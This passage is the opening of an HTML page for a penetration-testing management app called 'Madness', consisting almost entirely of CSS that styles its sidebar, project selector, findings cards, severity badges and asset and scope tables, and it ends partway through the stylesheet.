<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Madness - Penetration Testing Platform</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        :root {
            --bg-body: var(--grey-50);
            --bg-primary: #ffffff;
            --bg-secondary: var(--grey-100);
            --bg-accent: #eff6ff;
            --text-primary: var(--grey-900);
            --text-secondary: var(--grey-500);
            --text-accent: #3b82f6;
            --border-color: var(--grey-200);
            --border: 1px solid var(--border-color);
            --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
            --shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            --button-primary: #3b82f6;
            --button-hover: #2563eb;
            --sidebar-width: 280px;
            --topbar-height: 64px;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            
            /* Grey color system */
            --grey-50: #f8fafc;
            --grey-100: #f1f5f9;
            --grey-200: #e2e8f0;
            --grey-300: #cbd5e1;
            --grey-400: #94a3b8;
            --grey-500: #64748b;
            --grey-600: #475569;
            --grey-700: #334155;
            --grey-800: #1e293b;
            --grey-900: #0f172a;
            
            /* Dark theme specific greys */
            --dark-bg: #1a1a1a;
            --dark-card-bg: #2a2a2a;
            --dark-border: #3a3a3a;
            
            /* Border radius variables */
            --radius-small: 4px;
            --radius-medium: 8px;
            --radius-large: 12px;
            --radius-pill: 50px;
            
            /* Spacing variables */
            --spacing-xs: 0.25rem;
            --spacing-sm: 0.5rem;
            --spacing-md: 1rem;
            --spacing-lg: 1.5rem;
            --spacing-xl: 2rem;
            
            /* Typography variables */
            --font-xs: 0.75rem;
            --font-sm: 0.875rem;
            --font-base: 1rem;
            --font-lg: 1.125rem;
            --font-xl: 1.25rem;
            --font-2xl: 1.5rem;
        }
        
        /* Code Block and Finding Display Styles */
        .code-section {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-medium);
            margin: var(--spacing-md) 0;
            overflow: hidden;
        }
        
        .code-section.critical {
            border-left: 4px solid var(--danger);
            background: #fef2f2;
        }
        
        [data-theme="dark"] .code-section.critical {
            background: #2d1b1b;
        }
        
        .severity-header {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            padding: var(--spacing-sm) var(--spacing-md);
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            font-weight: 600;
        }
        
        .severity-header.critical {
            background: #fee2e2;
            color: var(--danger);
        }
        
        [data-theme="dark"] .severity-header.critical {
            background: #2d1b1b;
            color: #f87171;
        }
        
        .severity-icon {
            font-size: var(--font-lg);
        }
        
        .code-content {
            padding: var(--spacing-md);
        }
        
        .code-block {
            background: var(--grey-800);
            color: var(--grey-200);
            padding: var(--spacing-md);
            border-radius: var(--radius-small);
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: var(--font-sm);
            line-height: 1.5;
            overflow-x: auto;
            margin: var(--spacing-sm) 0;
        }
        
        .language-tag {
            background: var(--text-secondary);
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: var(--radius-small);
            font-size: var(--font-xs);
            font-weight: 500;
            text-transform: uppercase;
        }
        
        .language-undefined {
            background: var(--grey-500);
        }
        
        .language-bash {
            background: #10b981;
        }
        
        .language-shell {
            background: #3b82f6;
        }
        
        /* Syntax highlighting for code */
        .code-block .keyword {
            color: #ff79c6;
        }
        
        .code-block .string {
            color: #f1fa8c;
        }
        
        .code-block .comment {
            color: #6272a4;
            font-style: italic;
        }
        
        .code-block .function {
            color: #50fa7b;
        }
        
        .code-block .variable {
            color: #8be9fd;
        }
        
        .code-block .operator {
            color: #ff79c6;
        }
        
        /* Finding content styling */
        .finding-content {
            line-height: 1.7;
            color: var(--text-primary);
        }
        
        .finding-content p {
            margin-bottom: var(--spacing-md);
        }
        
        .finding-content code:not(.code-block code) {
            background: var(--bg-secondary);
            color: var(--text-accent);
            padding: 0.2rem 0.4rem;
            border-radius: var(--radius-small);
            font-family: monospace;
            font-size: 0.9em;
        }
        
        /* Vulnerability highlight */
        .vulnerability-highlight {
            background: linear-gradient(120deg, #fee2e2 0%, transparent 100%);
            border-left: 3px solid var(--danger);
            padding: var(--spacing-md);
            margin: var(--spacing-md) 0;
            border-radius: 0 var(--radius-small) var(--radius-small) 0;
        }
        
        [data-theme="dark"] .vulnerability-highlight {
            background: linear-gradient(120deg, #2d1b1b 0%, transparent 100%);
        }
        
        /* Critical finding styles */
        .finding-card.critical {
            border-left: 4px solid var(--danger);
        }
        
        .finding-card.critical .finding-header {
            background: linear-gradient(90deg, #fee2e2, transparent);
        }
        
        [data-theme="dark"] .finding-card.critical .finding-header {
            background: linear-gradient(90deg, #2d1b1b, transparent);
        }
        
        .severity-badge.critical {
            background: var(--danger);
            color: white;
            padding: 0.25rem 0.75rem;
            border-radius: var(--radius-pill);
            font-size: var(--font-xs);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        
        .severity-badge.high {
            background: #f59e0b;
        }
        
        .severity-badge.medium {
            background: #eab308;
        }
        
        .severity-badge.low {
            background: #10b981;
        }
        
        /* Findings Container Styles */
        .findings-container {
            padding: var(--spacing-lg);
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .findings-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-xl);
            padding: var(--spacing-lg);
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-large);
        }
        
        .findings-summary {
            display: flex;
            gap: var(--spacing-lg);
        }
        
        .summary-item {
            text-align: center;
        }
        
        .summary-number {
            font-size: var(--font-2xl);
            font-weight: 700;
            line-height: 1;
        }
        
        .summary-label {
            font-size: var(--font-sm);
            color: var(--text-secondary);
            margin-top: 0.25rem;
        }
        
        .findings-actions {
            display: flex;
            gap: var(--spacing-sm);
        }
        
        /* Finding Card Styles */
        .finding-card {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-large);
            margin-bottom: var(--spacing-lg);
            overflow: hidden;
            box-shadow: var(--shadow-sm);
            transition: all 0.2s;
        }
        
        .finding-card:hover {
            box-shadow: var(--shadow);
            transform: translateY(-1px);
        }
        
        .finding-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            padding: var(--spacing-lg);
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
        }
        
        .finding-title-section {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            flex: 1;
        }
        
        .finding-title {
            margin: 0;
            font-size: var(--font-xl);
            color: var(--text-primary);
        }
        
        .finding-meta {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 0.25rem;
            font-size: var(--font-sm);
            color: var(--text-secondary);
        }
        
        .finding-id {
            font-family: monospace;
            font-weight: 600;
        }
        
        .finding-content {
            padding: var(--spacing-lg);
        }
        
        .finding-actions {
            display: flex;
            gap: var(--spacing-sm);
            padding: var(--spacing-md) var(--spacing-lg);
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-color);
        }
        
        /* Responsive Design for Findings */
        @media (max-width: 768px) {
            .findings-container {
                padding: var(--spacing-md);
            }
            
            .findings-header {
                flex-direction: column;
                gap: var(--spacing-md);
            }
            
            .findings-summary {
                flex-wrap: wrap;
                justify-content: center;
                gap: var(--spacing-md);
            }
            
            .finding-header {
                flex-direction: column;
                gap: var(--spacing-md);
            }
            
            .finding-title-section {
                flex-direction: column;
                align-items: flex-start;
                gap: var(--spacing-sm);
            }
            
            .finding-actions {
                flex-wrap: wrap;
                gap: var(--spacing-xs);
            }
            
            .finding-actions .btn-secondary,
            .finding-actions .btn-danger {
                flex: 1;
                min-width: 120px;
            }
        }
        
        body[data-theme="dark"] {
            --bg-body: var(--grey-900);
            --bg-primary: var(--grey-800);
            --bg-secondary: var(--grey-700);
            --bg-accent: rgba(59, 130, 246, 0.1);
            --text-primary: var(--grey-50);
            --text-secondary: var(--grey-400);
            --text-accent: #60a5fa;
            --border-color: var(--grey-700);
            --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.2);
            --shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-body);
            color: var(--text-primary);
            transition: background 0.3s ease, color 0.3s ease;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }
        
        /* Mobile-First Layout */
        .app-layout {
            display: flex;
            min-height: 100vh;
            position: relative;
        }
        
        /* Sidebar */
        .sidebar {
            width: var(--sidebar-width);
            background: var(--bg-primary);
            border-right: var(--border);
            position: fixed;
            left: 0;
            top: 0;
            height: 100vh;
            z-index: 1000;
            overflow-y: auto;
            overflow-x: hidden;
            transform: translateX(-100%);
            transition: transform 0.3s ease;
        }
        
        .sidebar.open {
            transform: translateX(0);
        }
        
        /* Desktop: Show sidebar by default */
        @media (min-width: 1024px) {
            .sidebar {
                transform: translateX(0);
            }
            
            .main-content {
                margin-left: var(--sidebar-width);
            }
        }
        
        /* Mobile Menu Overlay */
        .mobile-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
            display: none;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .mobile-overlay.active {
            display: block;
            opacity: 1;
        }
        
        /* Sidebar Header */
        .sidebar-header {
            padding: 1.25rem;
            border-bottom: var(--border);
            display: flex;
            align-items: center;
            gap: 0.75rem;
            position: sticky;
            top: 0;
            background: var(--bg-primary);
            z-index: 10;
        }
        
        .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--button-primary), #8b5cf6);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 700;
            font-size: 1.25rem;
            flex-shrink: 0;
        }
        
        .app-name {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--text-primary);
        }
        
        /* Project Info */
        .project-info {
            padding: 1rem 1.25rem;
            border-bottom: var(--border);
            background: var(--bg-secondary);
        }
        
        .project-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 0.5rem;
        }
        
        .project-name {
            font-weight: 600;
            color: var(--text-primary);
            font-size: 0.95rem;
        }
        
        .project-ref {
            font-size: 0.75rem;
            color: var(--text-secondary);
            font-family: 'Courier New', monospace;
        }
        
        .project-actions {
            display: flex;
            gap: 0.25rem;
        }
        
        .project-btn {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 4px;
            padding: 0.375rem;
            cursor: pointer;
            color: var(--text-secondary);
            transition: all 0.2s ease;
            font-size: 0.875rem;
            line-height: 1;
        }
        
        .project-btn:hover {
            background: var(--bg-accent);
            color: var(--text-accent);
            border-color: var(--text-accent);
        }
        
        .project-status {
            font-size: 0.875rem;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            gap: 0.375rem;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--success);
            flex-shrink: 0;
        }
        
        /* Navigation */
        .nav-section {
            padding: 1.25rem 0;
        }
        
        .nav-section-title {
            padding: 0 1.25rem 0.75rem;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        
        .nav-menu {
            list-style: none;
        }
        
        .nav-item {
            margin-bottom: 2px;
        }
        
        .nav-link {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.75rem 1.25rem;
            color: var(--text-secondary);
            text-decoration: none;
            transition: all 0.2s ease;
            cursor: pointer;
            border-left: 3px solid transparent;
            position: relative;
        }
        
        .nav-link:hover {
            background: var(--bg-secondary);
            color: var(--text-primary);
        }
        
        .nav-link.active {
            background: var(--bg-accent);
            color: var(--text-accent);
            border-left-color: var(--text-accent);
        }
        
        .nav-icon {
            font-size: 1.125rem;
            width: 20px;
            text-align: center;
            flex-shrink: 0;
        }
        
        .nav-text {
            font-weight: 500;
            font-size: 0.875rem;
            flex: 1;
        }
        
        .nav-badge {
            background: var(--danger);
            color: white;
            font-size: 0.75rem;
            padding: 0.125rem 0.375rem;
            border-radius: 10px;
            min-width: 18px;
            text-align: center;
            font-weight: 600;
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            width: 100%;
        }
        
        /* Top Bar */
        .top-bar {
            background: var(--bg-primary);
            border-bottom: var(--border);
            padding: 1rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: var(--shadow-sm);
            min-height: var(--topbar-height);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 1rem;
            flex: 1;
        }
        
        .menu-toggle {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text-primary);
            padding: 0.25rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        @media (min-width: 1024px) {
            .menu-toggle {
                display: none;
            }
        }
        
        .app-brand {
            font-size: 1.125rem;
            font-weight: 700;
            color: var(--text-primary);
            padding-right: 1rem;
            border-right: 1px solid var(--border);
            margin-right: 1rem;
        }
        
        @media (max-width: 768px) {
            .app-brand {
                display: none;
            }
        }
        
        .page-header {
            flex: 1;
        }
        
        .page-title {
            font-size: 1.125rem;
            font-weight: 500;
            color: var(--text-secondary);
            margin-bottom: 0.125rem;
        }
        
        .breadcrumb {
            color: var(--text-secondary);
            font-size: 0.75rem;
            display: none;
        }
        
        @media (min-width: 640px) {
            .page-title {
                font-size: 1.5rem;
            }
            
            .breadcrumb {
                display: block;
                font-size: 0.875rem;
            }
        }
        
        /* Project Selector */
        .project-selector {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.5rem 1rem;
            background: var(--bg-secondary);
            border: var(--border);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            min-width: 200px;
            margin-right: 1rem;
        }
        
        .project-selector:hover {
            background: var(--bg-accent);
        }
        
        .project-info-compact {
            flex: 1;
        }
        
        .project-name-compact {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--text-primary);
            line-height: 1.2;
        }
        
        .project-ref-compact {
            font-size: 0.75rem;
            color: var(--text-secondary);
            line-height: 1.2;
        }
        
        .dropdown-arrow {
            color: var(--text-secondary);
            font-size: 0.75rem;
            transition: transform 0.2s ease;
        }
        
        .project-selector.open .dropdown-arrow {
            transform: rotate(180deg);
        }
        
        /* Project Dropdown */
        .project-dropdown {
            position: absolute;
            top: calc(100% + 0.5rem);
            left: 0;
            right: 0;
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 8px;
            box-shadow: var(--shadow);
            z-index: 1000;
            display: none;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .project-selector.open .project-dropdown {
            display: block;
        }
        
        .project-dropdown-header {
            padding: 0.75rem 1rem 0.5rem;
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border-bottom: var(--border);
        }
        
        .project-dropdown-item {
            padding: 0.75rem 1rem;
            cursor: pointer;
            transition: background 0.2s ease;
            border-left: 3px solid transparent;
        }
        
        .project-dropdown-item:hover {
            background: var(--bg-secondary);
        }
        
        .project-dropdown-item.active {
            background: var(--bg-accent);
            border-left-color: var(--text-accent);
        }
        
        .project-dropdown-name {
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
        }
        
        .project-dropdown-ref {
            font-size: 0.75rem;
            color: var(--text-secondary);
            margin-bottom: 0.25rem;
        }
        
        .project-dropdown-status {
            font-size: 0.75rem;
            padding: 0.125rem 0.375rem;
            border-radius: 12px;
            display: inline-block;
        }
        
        .project-dropdown-item.active .project-dropdown-status {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }
        
        .project-dropdown-item:not(.active) .project-dropdown-status {
            background: var(--bg-secondary);
            color: var(--text-secondary);
        }
        
        .project-dropdown-divider {
            height: 1px;
            background: var(--border-color);
            margin: 0.5rem 0;
        }
        
        .project-dropdown-action {
            padding: 0.75rem 1rem;
            margin: 0.5rem 1rem;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            color: var(--text-secondary);
            font-size: 0.875rem;
            font-weight: 500;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            background: var(--bg-primary);
        }
        
        .project-dropdown-action:hover {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border-color: var(--text-accent);
            transform: translateY(-1px);
            box-shadow: var(--shadow);
        }
        
        .project-dropdown-action.primary {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
            font-weight: 600;
            border: 1px solid #2563eb;
            box-shadow: 0 2px 4px rgba(59, 130, 246, 0.2);
        }
        
        .project-dropdown-action.primary:hover {
            background: linear-gradient(135deg, #2563eb, #1d4ed8);
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }
        
        .action-icon {
            width: 20px;
            height: 20px;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            font-size: 0.875rem;
            flex-shrink: 0;
        }
        
        .project-dropdown-action.primary .action-icon {
            background: rgba(255, 255, 255, 0.2);
        }
        
        /* Responsive project selector */
        @media (max-width: 768px) {
            .project-selector {
                min-width: 150px;
                margin-right: 0.5rem;
            }
            
            .project-name-compact {
                font-size: 0.8rem;
            }
            
            .project-ref-compact {
                font-size: 0.7rem;
            }
        }
        
        /* Assets Screen Styles */
        .assets-container {
            padding: 1.5rem;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .assets-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            margin-bottom: 2rem;
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 12px;
            padding: 1.5rem;
        }
        
        .assets-summary {
            display: flex;
            gap: 2rem;
        }
        
        .summary-item {
            text-align: center;
        }
        
        .summary-number {
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
        }
        
        .summary-label {
            font-size: 0.875rem;
            color: var(--text-secondary);
            font-weight: 500;
        }
        
        .assets-actions {
            display: flex;
            gap: 0.75rem;
        }
        
        .action-btn {
            padding: 0.6rem 1.2rem;
            border-radius: 8px;
            font-size: 0.875rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid;
        }
        
        .action-btn.primary {
            background: var(--button-primary);
            color: white;
            border-color: var(--button-primary);
        }
        
        .action-btn.primary:hover {
            background: var(--button-hover);
            border-color: var(--button-hover);
            transform: translateY(-1px);
            box-shadow: var(--shadow-lg);
        }
        
        .action-btn.secondary {
            background: var(--bg-primary);
            color: var(--text-secondary);
            border-color: var(--border-color);
        }
        
        .action-btn.secondary:hover {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border-color: var(--text-accent);
        }
        
        /* Assets Filters */
        .assets-filters {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 12px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            display: flex;
            flex-wrap: wrap;
            gap: 1.5rem;
            align-items: center;
        }
        
        .filter-section {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }
        
        .filter-section label {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--text-secondary);
            white-space: nowrap;
        }
        
        .filter-group {
            display: flex;
            gap: 0.5rem;
        }
        
        .filter-btn {
            padding: 0.5rem 0.75rem;
            border: 1px solid var(--border-color);
            background: var(--bg-primary);
            color: var(--text-secondary);
            border-radius: 6px;
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .filter-btn:hover {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border-color: var(--text-accent);
        }
        
        .filter-btn.active {
            background: var(--bg-accent);
            color: var(--text-accent);
            border-color: var(--text-accent);
        }
        
        .search-section {
            display: flex;
            align-items: center;
            margin-left: auto;
        }
        
        .search-input {
            padding: 0.5rem 1rem;
            border: 1px solid var(--border-color);
            border-radius: 6px 0 0 6px;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-size: 0.875rem;
            width: 300px;
            outline: none;
        }
        
        .search-input:focus {
            border-color: var(--text-accent);
        }
        
        .search-btn {
            padding: 0.5rem 0.75rem;
            border: 1px solid var(--border-color);
            border-left: none;
            border-radius: 0 6px 6px 0;
            background: var(--bg-secondary);
            cursor: pointer;
        }
        
        /* Assets Table */
        .assets-table-container {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 1.5rem;
        }
        
        .assets-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .assets-table thead th {
            background: var(--bg-secondary);
            color: var(--text-primary);
            font-weight: 600;
            font-size: 0.875rem;
            padding: 1rem 0.75rem;
            text-align: left;
            border-bottom: var(--border);
            cursor: pointer;
            transition: background 0.2s ease;
        }
        
        .assets-table thead th:hover {
            background: var(--bg-accent);
        }
        
        .sort-arrow {
            opacity: 0.5;
            font-size: 0.75rem;
            margin-left: 0.25rem;
        }
        
        .assets-table tbody td {
            padding: 0.75rem;
            border-bottom: 1px solid var(--border-color);
            font-size: 0.875rem;
        }
        
        .asset-row:hover {
            background: var(--bg-secondary);
        }
        
        .asset-type {
            display: inline-block;
            padding: 0.25rem 0.5rem;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: 500;
            white-space: nowrap;
        }
        
        .asset-type.host {
            background: rgba(99, 102, 241, 0.1);
            color: var(--text-accent);
        }
        
        .asset-type.webapp {
            background: rgba(34, 197, 94, 0.1);
            color: var(--success);
        }
        
        .asset-type.database {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .asset-type.network {
            background: rgba(168, 85, 247, 0.1);
            color: #a855f7;
        }
        
        .asset-type.cloud {
            background: rgba(6, 182, 212, 0.1);
            color: #06b6d4;
        }
        
        .criticality {
            padding: 0.25rem 0.5rem;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .criticality.critical {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
        }
        
        .criticality.high {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .criticality.medium {
            background: rgba(59, 130, 246, 0.1);
            color: var(--text-accent);
        }
        
        .criticality.low {
            background: rgba(34, 197, 94, 0.1);
            color: var(--success);
        }
        
        .tag {
            padding: 0.2rem 0.4rem;
            border-radius: 8px;
            font-size: 0.7rem;
            font-weight: 600;
            margin: 0.1rem;
            display: inline-block;
        }
        
        .tag.primary {
            background: var(--button-primary);
            color: white;
        }
        
        .tag.emergency {
            background: var(--danger);
            color: white;
        }
        
        .tag.technical {
            background: var(--text-accent);
            color: white;
        }
        
        .tag.business {
            background: #8b5cf6;
            color: white;
        }
        
        .tag.internal {
            background: var(--warning);
            color: white;
        }
        
        .tag.escalation {
            background: #ec4899;
            color: white;
        }
        
        .tag.report {
            background: var(--success);
            color: white;
        }
        
        .tag.source {
            background: var(--bg-accent);
            color: var(--text-accent);
        }
        
        .tag.completed {
            background: var(--success);
            color: white;
        }
        
        .tag.testing {
            background: var(--text-accent);
            color: white;
        }
        
        .tag.communication {
            background: var(--warning);
            color: white;
        }
        
        .tag.critical {
            background: var(--danger);
            color: white;
        }
        
        .tag.milestone {
            background: #8b5cf6;
            color: white;
        }
        
        .tag.project {
            background: var(--button-primary);
            color: white;
        }
        
        .tag.billable {
            background: var(--success);
            color: white;
        }
        
        .tag.personal {
            background: var(--text-accent);
            color: white;
        }
        
        .asset-type.travel {
            background: rgba(59, 130, 246, 0.1);
            color: #3b82f6;
        }
        
        .asset-type.accommodation {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }
        
        .asset-type.food {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .asset-type.equipment {
            background: rgba(139, 92, 246, 0.1);
            color: #8b5cf6;
        }
        
        .asset-type.presales {
            background: rgba(59, 130, 246, 0.1);
            color: #3b82f6;
        }
        
        .asset-type.authorization {
            background: rgba(34, 197, 94, 0.1);
            color: var(--success);
        }
        
        .asset-type.contracts {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
        }
        
        .asset-type.reports {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .status {
            padding: 0.25rem 0.5rem;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: 500;
        }
        
        .status.not-started {
            background: rgba(156, 163, 175, 0.1);
            color: #6b7280;
        }
        
        .status.testing {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .status.complete {
            background: rgba(34, 197, 94, 0.1);
            color: var(--success);
        }
        
        .findings-count {
            padding: 0.25rem 0.5rem;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: 600;
            min-width: 1.5rem;
            text-align: center;
        }
        
        .findings-count.none {
            background: rgba(156, 163, 175, 0.1);
            color: #6b7280;
        }
        
        .findings-count.low {
            background: rgba(34, 197, 94, 0.1);
            color: var(--success);
        }
        
        .findings-count.medium {
            background: rgba(245, 158, 11, 0.1);
            color: var(--warning);
        }
        
        .findings-count.high {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
        }
        
        .table-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            padding: 0.25rem 0.5rem;
            margin: 0 0.125rem;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.75rem;
        }
        
        .table-btn:hover {
            background: var(--bg-secondary);
            border-color: var(--text-accent);
        }
        
        /* Bulk Actions */
        .bulk-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-accent);
            border: 1px solid var(--text-accent);
            border-radius: 8px;
            padding: 1rem;
            margin-top: 1rem;
        }
        
        .bulk-info {
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--text-accent);
        }
        
        .bulk-buttons {
            display: flex;
            gap: 0.5rem;
        }
        
        .bulk-btn {
            padding: 0.5rem 1rem;
            border: 1px solid var(--text-accent);
            background: transparent;
            color: var(--text-accent);
            border-radius: 6px;
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        
        .bulk-btn:hover {
            background: var(--text-accent);
            color: white;
        }
        
        .bulk-btn.danger {
            border-color: var(--danger);
            color: var(--danger);
        }
        
        .bulk-btn.danger:hover {
            background: var(--danger);
            color: white;
        }
        
        /* Testing Segments for Scope */
        .testing-segments-container {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }
        
        .segment-card {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            box-shadow: var(--shadow-sm);
        }
        
        .segment-card[data-status="active"] {
            border-left: 4px solid var(--success);
        }
        
        .segment-card[data-status="planned"] {
            border-left: 4px solid var(--warning);
        }
        
        .segment-card-header {
            padding: 1.25rem;
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }
        
        .segment-info {
            display: flex;
            align-items: center;
            gap: 1rem;
        }
        
        .segment-icon {
            font-size: 2rem;
        }
        
        .segment-title {
            margin: 0;
            font-size: 1.125rem;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        .segment-meta {
            display: flex;
            gap: 0.75rem;
            align-items: center;
            margin-top: 0.25rem;
        }
        
        .segment-date {
            color: var(--text-secondary);
            font-size: 0.875rem;
        }
        
        .segment-actions {
            display: flex;
            gap: 0.5rem;
            align-items: center;
        }
        
        .segment-items-table {
            padding: 0;
        }
        
        .scope-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .scope-table th {
            background: var(--bg-secondary);
            padding: 0.75rem;
            text-align: left;
            font-weight: 600;
            font-size: 0.875rem;
            color: var(--text-secondary);
            border-bottom: 2px solid var(--border-color);
        }
        
        .scope-table td {
            padding: 0.75rem;
            border-bottom: 1px solid var(--border-color);
        }
        
        .scope-table tr:hover {
            background: var(--bg-secondary);
        }
        
        /* Double-click functionality styling */
        .asset-row {
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        
        .asset-row:hover {
            background: var(--bg-secondary) !important;
        }
        
        .asset-row:active {
            background: var(--border-color) !important;
        }
        
        /* Mobile Card View for Assets */
        .assets-mobile-view {
            display: none;
        }
        
        .asset-card {
            background: var(--bg-primary);
            border: var(--border);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
        }
        
        .asset-card-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 0.75rem;
        }
        
        .asset-card-title {
            font-size: 1rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 0.25rem;
        }
        
        .asset-card-subtitle {
            font-size: 0.875rem;
            color: var(--text-secondary);
            font-family: monospace;
        }
        
        .asset-card-badges {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
            align-items: flex-end;
        }
        
        .asset-card-details {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.75rem;
            margin-bottom: 1rem;
        }
        
        .asset-card-detail {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }
        
        .asset-card-detail-label {
            font-size: 0.75rem;
            color: var(--text-secondary);
            font-weight: 500;
        }
        
        .asset-card-detail-value {
            font-size: 0.875rem;
            color: var(--text-primary);
        }
        
        .asset-card-actions {
            display: flex;
            gap: 0.5rem;
